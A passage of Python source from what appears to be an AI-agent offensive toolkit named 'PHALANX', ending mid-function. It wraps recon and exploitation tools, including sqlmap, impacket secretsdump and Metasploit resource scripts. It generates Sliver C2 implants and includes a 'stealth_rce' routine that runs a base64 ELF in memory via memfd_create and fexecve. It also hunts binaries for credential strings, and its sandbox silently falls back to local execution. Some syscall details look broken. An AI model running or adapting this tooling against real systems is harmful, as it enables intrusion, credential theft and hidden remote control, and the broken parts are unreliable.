#!/usr/bin/env python3
"""
PHALANX Tools v3.3 – Gateway, tool runners, interactive sessions, skill registry.
Includes full recon, exploit, post‑exploit, C2, and SWARM‑specific tools.
All tools respect the sandbox configuration.

Enhanced with:
- Typed tool interfaces with parsers in TOOL_REGISTRY
- Model routing (reasoning vs fast model) in Gateway
- Built‑in parsers for nmap, nuclei, sqlmap, etc.
- Lightweight RAG Tool Optimizer (embedding-based tool retrieval)
- MCP (Model Context Protocol) compatibility layer for dynamic tool servers
- Thread‑safe registry updates (RLock)
- Robust Docker sandbox execution (fixed stdin issue)
- Fixed: command injection risk in sandbox (no shell wrapper)
- Fixed: stealth_rce platform detection for syscalls
- Fixed: scrape fallback parser when lxml missing
- Fixed: sliver fallback subprocess with shlex
- Fixed: nikto flag compatibility
- Fixed: embedding cache thread safety
- Added cloud_metadata_probe and template_injection_test tools
"""

from __future__ import annotations

import json
import re
import shutil
import subprocess
import threading
import time
import tempfile
import base64
import ctypes
import ctypes.util
import os
import sys
import logging
import inspect
import functools
import shlex
from pathlib import Path
from typing import Any, Dict, Iterator, List, Optional, Callable, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests

# Optional dependencies
_DOCKER_AVAILABLE = False
_TMUX_AVAILABLE = False
_PEXPECT_AVAILABLE = False
try:
    import docker
    _DOCKER_AVAILABLE = True
except ImportError:
    docker = None
try:
    import pexpect
    _PEXPECT_AVAILABLE = True
except ImportError:
    pexpect = None
if shutil.which("tmux"):
    _TMUX_AVAILABLE = True

# Web scraping – make fake_useragent optional
_SCRAPE_AVAILABLE = False
BeautifulSoup = None
UserAgent = None
try:
    from bs4 import BeautifulSoup
    _SCRAPE_AVAILABLE = True
except ImportError:
    pass
try:
    from fake_useragent import UserAgent
except ImportError:
    UserAgent = None

# Playwright for JS rendering
try:
    from playwright.sync_api import sync_playwright
    _PLAYWRIGHT_AVAILABLE = True
except ImportError:
    _PLAYWRIGHT_AVAILABLE = False

logger = logging.getLogger("phalanx_tools")

# ------------------------------------------------------------------
# Global config (set by Gateway or main)
# ------------------------------------------------------------------
_GLOBAL_CONFIG = {"sandbox": {"enabled": False, "image": "kalilinux/kali-rolling", "docker_network": "phalanx-net"}}

def set_global_config(config: dict):
    global _GLOBAL_CONFIG
    _GLOBAL_CONFIG.update(config)

def get_global_config() -> dict:
    return _GLOBAL_CONFIG

# ------------------------------------------------------------------
# Docker sandbox client (lazy) with proper error handling
# ------------------------------------------------------------------
_DOCKER_CLIENT = None
_DOCKER_CLIENT_LOCK = threading.Lock()

def get_docker_client():
    global _DOCKER_CLIENT
    if _DOCKER_CLIENT is None and _DOCKER_AVAILABLE:
        with _DOCKER_CLIENT_LOCK:
            if _DOCKER_CLIENT is None:
                try:
                    _DOCKER_CLIENT = docker.from_env()
                except Exception as e:
                    logger.warning(f"Docker client init failed: {e}")
                    _DOCKER_CLIENT = None
    return _DOCKER_CLIENT

# ------------------------------------------------------------------
# Unified execution: respects sandbox configuration (no shell injection)
# ------------------------------------------------------------------
def _execute_in_sandbox(cmd: List[str], timeout: int = 120, input_data: Optional[str] = None,
                        config: Optional[dict] = None) -> Dict:
    cfg = config or _GLOBAL_CONFIG
    sandbox_cfg = cfg.get("sandbox", {})
    if sandbox_cfg.get("enabled", False):
        docker_client = get_docker_client()
        if docker_client:
            image = sandbox_cfg.get("image", "kalilinux/kali-rolling")
            network = sandbox_cfg.get("docker_network", "phalanx-net")
            try:
                if input_data is not None:
                    logger.warning("Docker sandbox with stdin not supported, falling back to local")
                    return _execute_local(cmd, timeout, input_data)

                # Run command directly without shell wrapper (no injection risk)
                container = docker_client.containers.run(
                    image,
                    command=cmd,          # list of strings, not joined with shell
                    network=network,
                    detach=True,
                    stdin_open=False,
                    tty=False,
                    stdout=True,
                    stderr=True,
                )
                start = time.time()
                while time.time() - start < timeout:
                    container.reload()
                    if container.status in ("exited", "dead"):
                        break
                    time.sleep(0.5)
                else:
                    container.kill()
                    container.remove()
                    return {"output": "", "error": f"Sandbox timed out after {timeout}s", "rc": -1}

                result = container.wait()
                logs = container.logs(stdout=True, stderr=True).decode('utf-8', errors='replace')
                container.remove()
                return {"output": logs.strip(), "error": None, "rc": result["StatusCode"]}
            except Exception as e:
                logger.error(f"Docker sandbox execution failed: {e}, falling back to local")
                return _execute_local(cmd, timeout, input_data)
    return _execute_local(cmd, timeout, input_data)

def _execute_local(cmd: List[str], timeout: int = 120, input_data: Optional[str] = None) -> Dict:
    if not shutil.which(cmd[0]):
        return {"output": "", "error": f"Tool '{cmd[0]}' not found", "rc": -1}
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, input=input_data)
        return {
            "output": (result.stdout + result.stderr).strip(),
            "error": None if result.returncode == 0 else result.stderr.strip()[:500],
            "rc": result.returncode
        }
    except subprocess.TimeoutExpired:
        return {"output": "", "error": f"Timed out after {timeout}s", "rc": -1}
    except Exception as e:
        return {"output": "", "error": str(e), "rc": -1}

# ------------------------------------------------------------------
# Interactive session manager (tmux + pexpect)
# ------------------------------------------------------------------
class InteractiveSession:
    def __init__(self, tool: str, command: str, expect_prompt: str = None):
        self.tool = tool
        self.command = command
        self.expect_prompt = expect_prompt or r"[$#>]"
        self.session_name = f"phalanx_{tool}_{int(time.time())}"
        self.child = None
        self._started = False

    def start(self, timeout=10) -> bool:
        if not (_TMUX_AVAILABLE and _PEXPECT_AVAILABLE):
            return False
        try:
            subprocess.run(["tmux", "new-session", "-d", "-s", self.session_name, self.tool], check=True)
            subprocess.run(["tmux", "send-keys", "-t", self.session_name, self.command, "Enter"], check=True)
            time.sleep(0.5)
            self.child = subprocess.Popen(
                ["tmux", "capture-pane", "-p", "-t", self.session_name],
                stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
            )
            for _ in range(timeout * 2):
                time.sleep(0.5)
                out, _ = self.child.communicate(timeout=0.1)
                if out and re.search(self.expect_prompt, out):
                    self._started = True
                    return True
            return False
        except Exception as e:
            logger.error(f"Interactive session start failed: {e}")
            return False

    def send(self, text: str, expect_response=True, timeout=30) -> str:
        if not self._started:
            return ""
        try:
            subprocess.run(["tmux", "send-keys", "-t", self.session_name, text, "Enter"], check=True)
            if expect_response:
                time.sleep(1)
                for _ in range(timeout * 2):
                    time.sleep(0.5)
                    out, _ = self.child.communicate(timeout=0.1)
                    if out and re.search(self.expect_prompt, out):
                        return out
                return self._get_output()
            return ""
        except Exception as e:
            logger.error(f"Send failed: {e}")
            return ""

    def _get_output(self) -> str:
        try:
            result = subprocess.run(["tmux", "capture-pane", "-t", self.session_name, "-p"], capture_output=True, text=True)
            return result.stdout
        except:
            return ""

    def close(self):
        if self._started:
            subprocess.run(["tmux", "kill-session", "-t", self.session_name], stderr=subprocess.DEVNULL)
            self._started = False

def run_interactive(tool: str, command: str, timeout=60, expect_prompt=None, send_input=None) -> Dict:
    session = InteractiveSession(tool, command, expect_prompt)
    if not session.start():
        try:
            proc = subprocess.run(command.split(), capture_output=True, text=True, timeout=timeout)
            return {"output": proc.stdout, "error": proc.stderr, "rc": proc.returncode}
        except Exception as e:
            return {"output": "", "error": f"Interactive session not available: {e}", "rc": -1}
    output = ""
    if send_input and expect_prompt:
        output = session.send(send_input, expect_response=True, timeout=timeout)
    else:
        time.sleep(timeout)
        output = session._get_output()
    session.close()
    return {"output": output, "error": None, "rc": 0}

# ------------------------------------------------------------------
# Built‑in parsers (structured output extraction)
# ------------------------------------------------------------------
def parse_nmap_output(raw_output: str, args: Dict) -> Dict:
    ports_open = []
    services = []
    for line in raw_output.splitlines():
        m = re.match(r"(\d+)/\w+\s+open\s+(\S+)", line)
        if m:
            ports_open.append(m.group(1))
            services.append(m.group(2))
    os_match = re.search(r"OS guess:\s+(.+?)(?:\n|$)", raw_output)
    os_guess = os_match.group(1) if os_match else None
    return {
        "findings": [{"port": p, "service": s} for p, s in zip(ports_open, services)],
        "evidence": ports_open[:10],
        "next_hints": [f"Check service {s}" for s in set(services)],
        "confidence": 0.9 if ports_open else 0.5,
        "open_ports": ports_open,
        "services": services,
        "os_guess": os_guess
    }

def parse_nuclei_output(raw_output: str, args: Dict) -> Dict:
    findings = []
    for line in raw_output.splitlines():
        if not line.strip():
            continue
        try:
            data = json.loads(line)
            findings.append({
                "name": data.get("info", {}).get("name", "Unknown"),
                "severity": data.get("info", {}).get("severity", "info"),
                "description": data.get("info", {}).get("description", ""),
                "matched_at": data.get("matched-at", ""),
                "cve_id": data.get("info", {}).get("classification", {}).get("cve-id", [])
            })
        except:
            pass
    return {
        "findings": findings,
        "evidence": [f["name"] for f in findings[:5]],
        "next_hints": [f"Exploit {f['name']}" for f in findings[:3]],
        "confidence": 0.8 if findings else 0.3
    }

def parse_sqlmap_output(raw_output: str, args: Dict) -> Dict:
    injectable = "injectable" in raw_output.lower()
    db_match = re.search(r"back-end DBMS:\s+(.+?)(?:\n|$)", raw_output, re.I)
    dbms = db_match.group(1) if db_match else None
    return {
        "findings": [{"injectable": injectable, "dbms": dbms}] if injectable else [],
        "evidence": ["SQL injection detected"] if injectable else [],
        "next_hints": ["Dump data using --dump"] if injectable else [],
        "confidence": 0.95 if injectable else 0.0,
        "injectable": injectable,
        "dbms": dbms
    }

def parse_subfinder_output(raw_output: str, args: Dict) -> Dict:
    subs = [l.strip() for l in raw_output.splitlines() if l.strip()]
    return {
        "findings": [{"subdomain": s} for s in subs],
        "evidence": subs[:10],
        "next_hints": ["Run httpx on discovered subdomains"] if subs else [],
        "confidence": 0.9 if subs else 0.2,
        "subdomains": subs
    }

def parse_httpx_output(raw_output: str, args: Dict) -> Dict:
    urls = [l.strip() for l in raw_output.splitlines() if l.strip()]
    return {
        "findings": [{"url": u} for u in urls],
        "evidence": urls[:10],
        "next_hints": ["Run nuclei on discovered URLs"] if urls else [],
        "confidence": 0.85 if urls else 0.1,
        "urls": urls
    }

def parse_naabu_output(raw_output: str, args: Dict) -> Dict:
    ports = re.findall(r"(\d+)\s+open", raw_output)
    return {
        "findings": [{"port": p} for p in ports],
        "evidence": ports[:10],
        "next_hints": ["Run nmap -sV on open ports"] if ports else [],
        "confidence": 0.8 if ports else 0.2,
        "ports": ports
    }

def parse_ghidra_output(raw_output: str, args: Dict) -> Dict:
    interesting = []
    if "INTERESTING_STRINGS:" in raw_output:
        part = raw_output.split("INTERESTING_STRINGS:")[1].splitlines()[0]
        interesting = part.split(",")
    func_count = raw_output.count("Function at")
    return {
        "findings": [{"interesting_string": s} for s in interesting[:10]],
        "evidence": interesting[:5],
        "next_hints": ["Check for hardcoded credentials"] if interesting else [],
        "confidence": 0.7 if interesting else 0.3,
        "interesting_strings": interesting,
        "functions_count": func_count
    }

def parse_scrape_output(raw_output: str, args: Dict) -> Dict:
    return {
        "findings": args.get("parsed", {}).get("emails", []),
        "evidence": args.get("parsed", {}).get("emails", [])[:5],
        "next_hints": ["Check for forms and links"],
        "confidence": 0.9
    }

# ------------------------------------------------------------------
# Tool runners (raw output only – parsing moved to registry parsers)
# ------------------------------------------------------------------

def run_nmap(target: str, ports: str = "1-65535", flags: str = "-sV -sC --open", timeout: int = 300, config: Optional[dict] = None, **kwargs) -> Dict:
    if 'options' in kwargs:
        flags = kwargs['options']
    if '-p' in flags:
        cmd = ["nmap"] + flags.split() + [target]
    else:
        cmd = ["nmap"] + flags.split() + ["-p", ports, target]
    res = _execute_in_sandbox(cmd, timeout, config=config)
    return {"tool": "nmap", "target": target, "output": res["output"], "error": res["error"], "rc": res["rc"]}

def run_nmap_quick(target: str, timeout=60, config=None) -> Dict:
    cmd = ["nmap", "-sV", "--open", "--top-ports", "1000", target]
    res = _execute_in_sandbox(cmd, timeout, config=config)
    return {"tool": "nmap_quick", "target": target, "output": res["output"], "error": res["error"], "rc": res["rc"]}

def run_whois(target: str, timeout=30, config=None) -> Dict:
    res = _execute_in_sandbox(["whois", target], timeout, config=config)
    return {"tool": "whois", "target": target, "output": res["output"], "error": res["error"], "rc": res["rc"]}

def run_dig(target: str, record="ANY", timeout=15, config=None) -> Dict:
    res = _execute_in_sandbox(["dig", target, record, "+noall", "+answer"], timeout, config=config)
    return {"tool": "dig", "target": target, "output": res["output"], "error": res["error"], "rc": res["rc"]}

def run_subfinder(domain: str, timeout=60, config=None) -> Dict:
    res = _execute_in_sandbox(["subfinder", "-d", domain, "-silent"], timeout, config=config)
    return {"tool": "subfinder", "target": domain, "output": res["output"], "error": res["error"], "rc": res["rc"]}

def run_theharvester(domain: str, sources="all", timeout=120, config=None) -> Dict:
    res = _execute_in_sandbox(["theHarvester", "-d", domain, "-b", sources, "-l", "200"], timeout, config=config)
    return {"tool": "theharvester", "target": domain, "output": res["output"], "error": res["error"], "rc": res["rc"]}

def run_enum4linux(target: str, timeout=180, config=None) -> Dict:
    res = _execute_in_sandbox(["enum4linux", "-a", target], timeout, config=config)
    return {"tool": "enum4linux", "target": target, "output": res["output"], "error": res["error"], "rc": res["rc"]}

def run_httpx(targets: str, timeout=120, config=None) -> Dict:
    tmp_file = None
    try:
        cmd = ["httpx", "-silent", "-threads", "20", "-timeout", "5"]
        if "," in targets:
            with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
                for t in targets.split(","):
                    f.write(t.strip() + "\n")
                tmp_file = f.name
            cmd.extend(["-l", tmp_file])
            res = _execute_in_sandbox(cmd, timeout, config=config)
        else:
            cmd.append(targets)
            res = _execute_in_sandbox(cmd, timeout, config=config)
        return {"tool": "httpx", "target": targets, "output": res["output"], "error": res["error"], "rc": res["rc"]}
    finally:
        if tmp_file and os.path.exists(tmp_file):
            os.unlink(tmp_file)

def run_nuclei(target: str, severity="info", timeout=300, config=None) -> Dict:
    cmd = ["nuclei", "-target", target, "-silent", "-severity", severity, "-json"]
    res = _execute_in_sandbox(cmd, timeout, config=config)
    return {"tool": "nuclei", "target": target, "output": res["output"], "error": res["error"], "rc": res["rc"]}

def run_naabu(target: str, ports="top-1000", timeout=180, config=None) -> Dict:
    cmd = ["naabu", "-host", target, "-ports", ports, "-silent"]
    res = _execute_in_sandbox(cmd, timeout, config=config)
    return {"tool": "naabu", "target": target, "output": res["output"], "error": res["error"], "rc": res["rc"]}

def run_katana(target: str, depth=3, timeout=180, config=None) -> Dict:
    cmd = ["katana", "-u", target, "-depth", str(depth), "-silent"]
    res = _execute_in_sandbox(cmd, timeout, config=config)
    return {"tool": "katana", "target": target, "output": res["output"], "error": res["error"], "rc": res["rc"]}

def run_dnsx(domain: str, timeout=60, config=None) -> Dict:
    cmd = ["dnsx", "-d", domain, "-recon", "-silent"]
    res = _execute_in_sandbox(cmd, timeout, config=config)
    return {"tool": "dnsx", "target": domain, "output": res["output"], "error": res["error"], "rc": res["rc"]}

def run_gau(domain: str, timeout=120, config=None) -> Dict:
    cmd = ["gau", domain]
    res = _execute_in_sandbox(cmd, timeout, config=config)
    return {"tool": "gau", "target": domain, "output": res["output"], "error": res["error"], "rc": res["rc"]}

def run_nikto(target: str, timeout=300, config=None) -> Dict:
    url = target if target.startswith("http") else f"http://{target}"
    cmd = ["nikto", "-h", url, "-Format", "txt"]
    res = _execute_in_sandbox(cmd, timeout, config=config)
    return {"tool": "nikto", "target": target, "output": res["output"], "error": res["error"], "rc": res["rc"]}

def run_whatweb(target: str, timeout=30, config=None) -> Dict:
    url = target if target.startswith("http") else f"http://{target}"
    res = _execute_in_sandbox(["whatweb", "-a", "3", url], timeout, config=config)
    return {"tool": "whatweb", "target": target, "output": res["output"], "error": res["error"], "rc": res["rc"]}

def run_gobuster(target: str, wordlist="/usr/share/wordlists/dirb/common.txt", timeout=300, config=None) -> Dict:
    if not Path(wordlist).exists():
        return {"tool": "gobuster", "target": target, "output": "", "error": "Wordlist not found", "rc": -1}
    url = target if target.startswith("http") else f"http://{target}"
    cmd = ["gobuster", "dir", "-u", url, "-w", wordlist, "-q", "--no-progress", "-t", "20"]
    res = _execute_in_sandbox(cmd, timeout, config=config)
    return {"tool": "gobuster", "target": target, "output": res["output"], "error": res["error"], "rc": res["rc"]}

def run_ffuf(target: str, wordlist="/usr/share/seclists/Discovery/Web-Content/common.txt", timeout=300, config=None) -> Dict:
    if not Path(wordlist).exists():
        wordlist = "/usr/share/wordlists/dirb/common.txt"
        if not Path(wordlist).exists():
            return {"tool": "ffuf", "target": target, "output": "", "error": "Wordlist not found", "rc": -1}
    url = target if target.startswith("http") else f"http://{target}"
    if "FUZZ" not in url:
        url = url.rstrip("/") + "/FUZZ"
    cmd = ["ffuf", "-u", url, "-w", wordlist, "-s", "-mc", "200,301,302,403", "-t", "30"]
    res = _execute_in_sandbox(cmd, timeout, config=config)
    return {"tool": "ffuf", "target": target, "output": res["output"], "error": res["error"], "rc": res["rc"]}

def run_wpscan(target: str, timeout=180, config=None) -> Dict:
    url = target if target.startswith("http") else f"http://{target}"
    res = _execute_in_sandbox(["wpscan", "--url", url, "--no-update", "--format", "cli-no-color"], timeout, config=config)
    return {"tool": "wpscan", "target": target, "output": res["output"], "error": res["error"], "rc": res["rc"]}

def run_sqlmap(target: str, data=None, level=1, risk=1, timeout=600, config=None) -> Dict:
    url = target if target.startswith("http") else f"http://{target}"
    cmd = ["sqlmap", "-u", url, "--batch", f"--level={level}", f"--risk={risk}", "--output-dir=/tmp/phalanx_sqlmap"]
    if data:
        cmd.extend(["--data", data])
    res = _execute_in_sandbox(cmd, timeout, config=config)
    return {"tool": "sqlmap", "target": target, "output": res["output"], "error": res["error"], "rc": res["rc"]}

def run_sqlmap_detect(target: str, timeout=120, config=None) -> Dict:
    return run_sqlmap(target, level=1, risk=1, timeout=timeout, config=config)

def run_scrape(target: str, timeout=30, use_js=True, config=None) -> Dict:
    if not _SCRAPE_AVAILABLE:
        return {"tool": "scrape", "target": target, "output": "", "error": "BeautifulSoup not installed. Run: pip install beautifulsoup4", "rc": -1}
    if not target.startswith(("http://", "https://")):
        target = "http://" + target
    html = ""
    if use_js and _PLAYWRIGHT_AVAILABLE:
        try:
            with sync_playwright() as p:
                browser = p.chromium.launch(headless=True)
                page = browser.new_page()
                page.goto(target, timeout=timeout*1000)
                page.wait_for_load_state("networkidle")
                html = page.content()
                browser.close()
        except Exception as e:
            return {"tool": "scrape", "target": target, "output": "", "error": f"Playwright error: {e}", "rc": -1}
    else:
        try:
            if UserAgent:
                ua = UserAgent()
                headers = {"User-Agent": ua.random}
            else:
                headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
            r = requests.get(target, headers=headers, timeout=timeout)
            html = r.text
        except Exception as e:
            return {"tool": "scrape", "target": target, "output": "", "error": str(e), "rc": -1}
    try:
        soup = BeautifulSoup(html, "lxml")
    except Exception:
        soup = BeautifulSoup(html, "html.parser")
    emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', soup.get_text())
    links = [a.get('href') for a in soup.find_all('a', href=True)][:50]
    forms = [{"action": f.get('action', ''), "method": f.get('method', 'get')} for f in soup.find_all('form')]
    tech_hints = []
    tech_patterns = ['wordpress', 'drupal', 'joomla', 'nginx', 'apache', 'iis', 'php', 'asp.net', 'ruby on rails', 'django', 'flask', 'node.js', 'express', 'react', 'angular', 'vue', 'jquery', 'bootstrap']
    for pattern in tech_patterns:
        if pattern.lower() in html.lower():
            tech_hints.append(pattern)
    parsed = {
        "title": soup.title.string.strip() if soup.title else None,
        "emails": list(set(emails))[:20],
        "links_count": len(links),
        "sample_links": links[:10],
        "forms": forms,
        "tech_hints": list(set(tech_hints))[:10]
    }
    output = f"Scraped {target} – {len(emails)} emails, {len(links)} links, {len(forms)} forms"
    return {"tool": "scrape", "target": target, "output": output, "parsed": parsed, "error": None, "rc": 0}

def run_msfconsole(resource: str, timeout=600, config=None) -> Dict:
    if not resource:
        return {"tool": "msfconsole", "target": "", "output": "", "error": "Missing resource script", "rc": -1}
    cmd = ["msfconsole", "-q", "-r", resource]
    res = _execute_in_sandbox(cmd, timeout, config=config)
    return {"tool": "msfconsole", "target": resource, "output": res["output"], "error": res["error"], "rc": res["rc"]}

def run_searchsploit(query: str, timeout=20, config=None) -> Dict:
    cmd = ["searchsploit", "-t", query]
    res = _execute_in_sandbox(cmd, timeout, config=config)
    return {"tool": "searchsploit", "target": query, "output": res["output"], "error": res["error"], "rc": res["rc"]}

def run_impacket(target: str, tool="secretsdump", args="", timeout=300, config=None) -> Dict:
    impacket_cmd = f"impacket-{tool}"
    if not shutil.which(impacket_cmd):
        return {"tool": f"impacket_{tool}", "target": target, "output": "", "error": f"{impacket_cmd} not found", "rc": -1}
    cmd = [impacket_cmd, target] + args.split()
    res = _execute_in_sandbox(cmd, timeout, config=config)
    return {"tool": f"impacket_{tool}", "target": target, "output": res["output"], "error": res["error"], "rc": res["rc"]}

def run_sliver_generate(target_ip: str, mtls_port=443, timeout=60, config=None) -> Dict:
    if not shutil.which("sliver-client"):
        return {"tool": "sliver_generate", "target": target_ip, "output": "", "error": "sliver-client not installed", "rc": -1}
    cmd = f"generate --mtls {target_ip}:{mtls_port} --os linux --save /tmp/phalanx_implant"
    try:
        res = run_interactive("sliver-client", cmd, timeout=timeout, expect_prompt="[*]")
        if res.get("rc", -1) == 0:
            return {"tool": "sliver_generate", "target": target_ip, "output": res["output"], "error": res.get("error"), "rc": 0}
    except Exception as e:
        logger.warning(f"Interactive sliver failed: {e}, trying subprocess")
    try:
        cmd_parts = shlex.split(cmd)
        proc = subprocess.run(["sliver-client"] + cmd_parts, capture_output=True, text=True, timeout=timeout)
        return {"tool": "sliver_generate", "target": target_ip, "output": proc.stdout, "error": proc.stderr, "rc": proc.returncode}
    except Exception as e:
        return {"tool": "sliver_generate", "target": target_ip, "output": "", "error": str(e), "rc": -1}

def run_sliver_sessions(timeout=30, config=None) -> Dict:
    if not shutil.which("sliver-client"):
        return {"tool": "sliver_sessions", "target": "", "output": "", "error": "sliver-client not installed", "rc": -1}
    try:
        res = run_interactive("sliver-client", "sessions", timeout=timeout, expect_prompt="[*]")
        if res.get("rc", -1) == 0:
            return {"tool": "sliver_sessions", "target": "", "output": res["output"], "error": res.get("error"), "rc": 0}
    except Exception:
        pass
    try:
        proc = subprocess.run(["sliver-client", "sessions"], capture_output=True, text=True, timeout=timeout)
        return {"tool": "sliver_sessions", "target": "", "output": proc.stdout, "error": proc.stderr, "rc": proc.returncode}
    except Exception as e:
        return {"tool": "sliver_sessions", "target": "", "output": "", "error": str(e), "rc": -1}

def _get_syscall_numbers():
    """Return memfd_create and fexecve syscall numbers for the current architecture."""
    machine = os.uname().machine
    if machine == 'x86_64':
        return 319, 322
    elif machine == 'aarch64' or machine == 'arm64':
        return 279, 279  # fexecve not defined? fallback
    elif machine.startswith('arm'):
        return 385, None
    else:
        return None, None

def run_stealth_rce(elf_b64: str, argv: list = None, envp: list = None, config=None) -> Dict:
    syscall_memfd, syscall_fexecve = _get_syscall_numbers()
    if syscall_memfd is None or syscall_fexecve is None:
        return {"tool": "stealth_rce", "output": "", "error": "Unsupported architecture for memfd_create", "rc": -1}

    libc_path = ctypes.util.find_library("c")
    if libc_path is None:
        if sys.platform.startswith("linux"):
            libc_path = "libc.so.6"
        elif sys.platform == "darwin":
            libc_path = "libc.dylib"
        else:
            return {"tool": "stealth_rce", "output": "", "error": "Cannot find libc", "rc": -1}
    try:
        libc = ctypes.CDLL(libc_path, use_errno=True)
    except OSError as e:
        return {"tool": "stealth_rce", "output": "", "error": f"Failed to load libc: {e}", "rc": -1}

    def memfd_create(name: bytes, flags: int = 0) -> int:
        return libc.syscall(syscall_memfd, name, flags)
    def fexecve(fd: int, argv_list: list, envp_list: list) -> int:
        argv_arr = (ctypes.c_char_p * (len(argv_list)+1))()
        for i, arg in enumerate(argv_list):
            argv_arr[i] = arg.encode()
        argv_arr[len(argv_list)] = None
        envp_arr = (ctypes.c_char_p * (len(envp_list)+1))()
        for i, env in enumerate(envp_list):
            envp_arr[i] = env.encode()
        envp_arr[len(envp_list)] = None
        return libc.syscall(syscall_fexecve, fd, argv_arr, envp_arr)

    try:
        elf_bytes = base64.b64decode(elf_b64)
    except:
        return {"tool": "stealth_rce", "output": "", "error": "Invalid base64", "rc": -1}
    fd = memfd_create(b"payload", 0)
    if fd < 0:
        return {"tool": "stealth_rce", "output": "", "error": f"memfd_create failed: {ctypes.get_errno()}", "rc": -1}
    try:
        os.write(fd, elf_bytes)
        argv = argv or ["payload"]
        envp = envp or []
        fexecve(fd, argv, envp)
        return {"tool": "stealth_rce", "output": "", "error": "fexecve did not replace process", "rc": -1}
    except Exception as e:
        return {"tool": "stealth_rce", "output": "", "error": str(e), "rc": -1}
    finally:
        os.close(fd)

def run_copyright_osint(target: str, timeout=120, config=None) -> Dict:
    domain = target
    results = {"target": domain, "findings": [], "risk_score": 0.0}
    def add_finding(finding_type, evidence, severity="info"):
        results["findings"].append({"type": finding_type, "evidence": str(evidence)[:500], "severity": severity})
        if severity == "high":
            results["risk_score"] += 0.4
        elif severity == "medium":
            results["risk_score"] += 0.2
        else:
            results["risk_score"] += 0.05
    scrape = run_scrape(domain, timeout=timeout, use_js=False, config=config)
    if scrape["rc"] == 0 and scrape.get("parsed"):
        text = scrape["output"]
        if "copyright" in text.lower() or "©" in text:
            add_finding("copyright_notice", "Found copyright text", "info")
    piracy_paths = ["/movies/", "/cracks/", "/warez/", "/torrents/", "/mp3/"]
    for path in piracy_paths:
        test_url = f"http://{domain}{path}"
        try:
            r = requests.get(test_url, timeout=10)
            if r.status_code == 200:
                add_finding("potential_piracy_directory", test_url, "medium")
        except:
            pass
    results["risk_score"] = min(1.0, results["risk_score"])
    return {"tool": "copyright_osint", "target": domain, "output": f"Found {len(results['findings'])} findings", "parsed": results, "error": None, "rc": 0}

def run_burp_scan(target: str, scan_type="active", timeout=600, config=None) -> Dict:
    logger.warning("Burp scan is a placeholder – implement REST API or headless.")
    return {
        "tool": "burp_scan",
        "target": target,
        "output": "Burp scan not fully integrated. Use --sandbox disabled and configure Burp REST API.",
        "parsed": {},
        "error": None,
        "rc": 0
    }

def run_ghidra_analyze(binary_path: str, timeout=300, config=None) -> Dict:
    if not Path(binary_path).exists():
        return {"tool": "ghidra_analyze", "target": binary_path, "output": "", "parsed": {}, "error": f"Binary not found: {binary_path}", "rc": -1}

    ghidra_install = os.environ.get("GHIDRA_INSTALL_DIR")
    analyze_cmd = None
    if ghidra_install:
        analyze_cmd = str(Path(ghidra_install) / "support" / "analyzeHeadless")
        if not Path(analyze_cmd).exists():
            analyze_cmd = None
    if not analyze_cmd:
        analyze_cmd = shutil.which("analyzeHeadless")

    if analyze_cmd and Path(analyze_cmd).exists():
        project_dir = tempfile.mkdtemp(prefix="ghidra_")
        project_name = "phalanx_analysis"
        script_path = Path(project_dir) / "FindStringsScript.java"
        script_path.write_text("""
import ghidra.app.script.GhidraScript;
import ghidra.program.model.listing.*;
import java.util.*;
public class FindStringsScript extends GhidraScript {
    @Override
    protected void run() throws Exception {
        List<String> interesting = new ArrayList<>();
        DataIterator data = currentProgram.getListing().getDefinedData(true);
        while (data.hasNext()) {
            Data d = data.next();
            if (d.getValue() instanceof String) {
                String s = (String) d.getValue();
                if (s.length() > 4 && s.matches(".*[a-zA-Z0-9_].*")) {
                    if (s.contains("pass") || s.contains("key") || s.contains("token") || s.contains("admin"))
                        interesting.add(s);
                }
            }
        }
        println("INTERESTING_STRINGS:" + String.join(",", interesting));
    }
}
""")
        cmd = [analyze_cmd, project_dir, project_name, "-import", binary_path, "-postScript", str(script_path)]
        try:
            res = _execute_in_sandbox(cmd, timeout, config=config)
            output = res["output"]
            interesting = []
            if "INTERESTING_STRINGS:" in output:
                part = output.split("INTERESTING_STRINGS:")[1].splitlines()[0]
                interesting = part.split(",")
            functions_count = output.count("Function at")
            shutil.rmtree(project_dir, ignore_errors=True)
            return {
                "tool": "ghidra_analyze",
                "target": binary_path,
                "output": output,
                "parsed": {
                    "functions_count": functions_count,
                    "interesting_strings": interesting[:10],
                    "vulnerabilities": []
                },
                "error": res["error"],
                "rc": res["rc"]
            }
        except Exception as e:
            shutil.rmtree(project_dir, ignore_errors=True)
            logger.warning(f"Ghidra analysis failed: {e}, falling back to basic tools")

    result = {
        "tool": "ghidra_analyze",
        "target": binary_path,
        "output": "",
        "parsed": {
            "functions_count": 0,
            "interesting_strings": [],
            "vulnerabilities": []
        },
        "error": None,
        "rc": 0
    }
    output_lines = []
    try:
        file_res = subprocess.run(["file", binary_path], capture_output=True, text=True, timeout=10)
        if file_res.returncode == 0:
            output_lines.append(f"File info: {file_res.stdout.strip()}")
            result["parsed"]["file_type"] = file_res.stdout.strip()
    except Exception as e:
        logger.warning(f"file command failed: {e}")

    try:
        strings_res = subprocess.run(["strings", binary_path], capture_output=True, text=True, timeout=60)
        if strings_res.returncode == 0:
            all_strings = strings_res.stdout.splitlines()
            interesting_patterns = ['pass', 'key', 'token', 'secret', 'admin', 'password', 'api_key', 'auth', 'credential']
            interesting = [s for s in all_strings if any(p in s.lower() for p in interesting_patterns)]
            result["parsed"]["interesting_strings"] = interesting[:20]
            output_lines.append(f"Found {len(interesting)} interesting strings (e.g., {interesting[0] if interesting else 'none'})")
    except Exception as e:
        logger.warning(f"strings command failed: {e}")

    try:
        objdump_res = subprocess.run(["objdump", "-T", binary_path], capture_output=True, text=True, timeout=30)
        if objdump_res.returncode == 0:
            func_lines = [l for l in objdump_res.stdout.splitlines() if 'DF' in l or 'FUNC' in l]
            result["parsed"]["functions_count"] = len(func_lines)
            output_lines.append(f"Found {len(func_lines)} function symbols")
    except Exception as e:
        logger.warning(f"objdump command failed: {e}")

    result["output"] = "\n".join(output_lines)
    if not result["parsed"]["interesting_strings"] and result["parsed"]["functions_count"] == 0:
